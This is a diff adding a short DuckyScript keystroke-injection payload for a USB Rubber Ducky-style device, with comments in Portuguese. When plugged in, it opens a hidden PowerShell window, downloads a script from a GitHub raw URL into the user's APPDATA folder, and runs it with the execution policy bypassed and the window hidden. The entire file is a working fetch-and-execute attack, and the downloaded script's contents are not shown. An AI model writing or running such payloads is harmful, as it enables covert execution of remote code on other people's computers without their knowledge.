@@ -1,0 +1,19 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Define caminho do script
+STRING $scriptPath = "$env:APPDATA\gansodemorado.ps1"
+ENTER
+
+REM Baixa o script do GitHub
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Herna4ndes/Ganso/main/gansodemorado.ps1" -OutFile $scriptPath
+ENTER
+DELAY 3000
+
+REM Executa o script
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $scriptPath
+ENTER
